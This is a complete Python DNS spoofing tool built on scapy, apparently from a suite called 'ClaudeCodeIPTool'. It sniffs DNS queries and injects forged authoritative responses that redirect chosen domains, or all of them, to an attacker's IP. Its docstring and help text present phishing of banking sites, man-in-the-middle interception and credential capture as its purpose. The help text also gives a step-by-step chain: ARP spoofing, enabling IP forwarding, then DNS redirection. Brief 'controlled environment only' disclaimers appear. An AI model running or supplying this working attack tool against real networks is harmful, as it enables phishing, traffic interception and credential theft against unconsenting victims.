#!/usr/bin/env python3
"""
DNS Spoofing Module - ClaudeCodeIPTool
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Intercept DNS queries and return forged responses.
Redirect target's traffic to attacker-controlled IPs.

Attack Flow:
1. Target sends DNS query for example.com
2. Tool intercepts and responds first (before real DNS)
3. Target receives fake IP (e.g., your server)
4. Target connects to YOUR IP instead of real example.com

Use Cases:
- Phishing (redirect bank.com → fake login page)
- MITM (redirect all traffic through proxy)
- Traffic analysis (capture credentials, API keys)

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
"""

import argparse
import sys
from scapy.all import (
    DNS, DNSQR, DNSRR, IP, UDP, sniff, send, conf
)

conf.verb = 0


class DNSSpoofer:
    """
    DNS cache poisoning via response injection.

    Intercepts DNS queries and injects forged responses.
    """

    def __init__(self, domain_map, interface=None, verbose=False):
        """
        Args:
            domain_map: dict mapping domains to fake IPs
                       e.g., {'bank.com': '192.168.1.50', '*': '192.168.1.50'}
            interface: Network interface to sniff
            verbose: Enable verbose logging
        """
        self.domain_map = domain_map
        self.interface = interface or conf.iface
        self.verbose = verbose
        self.spoof_count = 0

    def log(self, msg, level="INFO"):
        if self.verbose or level in ["SPOOF", "RESULT"]:
            prefix = {
                "SPOOF": "[🎭]",
                "RESULT": "[+]",
                "INFO": "[*]",
            }.get(level, "[ ]")
            print(f"{prefix} {msg}")

    def get_fake_ip(self, domain):
        """Get fake IP for domain from mapping"""
        # Exact match
        if domain in self.domain_map:
            return self.domain_map[domain]

        # Wildcard match
        if '*' in self.domain_map:
            return self.domain_map['*']

        return None

    def spoof_dns(self, pkt):
        """Inject forged DNS response"""
        if not pkt.haslayer(DNSQR):
            return

        queried_domain = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
        fake_ip = self.get_fake_ip(queried_domain)

        if not fake_ip:
            return

        # Build spoofed DNS response
        spoofed_pkt = IP(
            dst=pkt[IP].src,
            src=pkt[IP].dst
        ) / UDP(
            dport=pkt[UDP].sport,
            sport=53
        ) / DNS(
            id=pkt[DNS].id,
            qr=1,  # Response
            aa=1,  # Authoritative
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=pkt[DNSQR].qname,
                ttl=10,
                rdata=fake_ip
            )
        )

        send(spoofed_pkt, verbose=0, iface=self.interface)
        self.spoof_count += 1

        self.log(f"Spoofed: {queried_domain} → {fake_ip} (victim: {pkt[IP].src})", "SPOOF")

    def start(self):
        """Start DNS spoofing"""
        self.log(f"DNS spoofing started on {self.interface}", "RESULT")
        self.log(f"Domain mappings: {self.domain_map}", "INFO")
        self.log("Press Ctrl+C to stop", "INFO")

        try:
            sniff(
                filter="udp port 53",
                prn=self.spoof_dns,
                store=0,
                iface=self.interface
            )
        except KeyboardInterrupt:
            self.log(f"\nStopped. Spoofed {self.spoof_count} DNS queries", "RESULT")


def main():
    parser = argparse.ArgumentParser(
        description="DNS Spoofing - Redirect target's traffic",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Redirect bank.com to your phishing server
  sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50

  # Redirect ALL domains to your server (wildcard)
  sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50

  # Multiple domain mappings
  sudo python3 dns-spoof.py --map bank.com:192.168.1.50,google.com:192.168.1.51

Typical Attack Chain:
  1. ARP spoof target (make traffic go through you)
     sudo python3 arp-spoof.py spoof <target> --spoof-ip <gateway>

  2. Enable IP forwarding (relay traffic)
     sysctl -w net.ipv4.ip_forward=1

  3. Start DNS spoofing (redirect specific domains)
     sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50

  4. Target visits bank.com → gets your IP → phishing success

CONTROLLED ENVIRONMENT ONLY - Unauthorized use is illegal.
        """
    )

    parser.add_argument('--domain', help='Domain to spoof (use * for all)')
    parser.add_argument('--ip', help='Fake IP to return')
    parser.add_argument('--map', help='Domain:IP mappings (comma-separated)')
    parser.add_argument('--interface', help='Network interface (default: auto)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    # Build domain mapping
    domain_map = {}

    if args.map:
        for mapping in args.map.split(','):
            domain, ip = mapping.split(':')
            domain_map[domain.strip()] = ip.strip()
    elif args.domain and args.ip:
        domain_map[args.domain] = args.ip
    else:
        parser.print_help()
        sys.exit(1)

    # Start spoofing
    spoofer = DNSSpoofer(domain_map, args.interface, args.verbose)
    spoofer.start()


if __name__ == "__main__":
    main()
